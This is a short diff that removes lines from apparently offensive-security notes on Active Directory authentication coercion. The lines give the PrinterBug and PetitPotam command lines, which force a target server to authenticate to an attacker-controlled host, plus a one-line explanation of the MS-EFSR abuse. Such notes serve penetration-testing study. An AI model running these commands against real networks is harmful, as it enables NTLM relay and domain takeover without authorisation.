@@ -1,7 +1,0 @@
-- PrinterBug - Induce authentication from any one machine on the network to any other
-	- `python3 /opt/krbrelayx/printerbug.py domain.local/user:password@target <targetIP>`
-- PetitPotam Authentication Coercion
-	- Microsoft Encrypting File System Remote Protocol (MS-EFSR) allows AD server to remotely manage encrypted information using RPC
-	- Can connect to a server unauthenticated and force it to open an "encrypted file" on your machine, thus forcing it to authenticate to you.
-	- Exploitation:
-		- `python /opt/PetitPotam/petitpotam.py <responder_IP> <target> -pipe all`
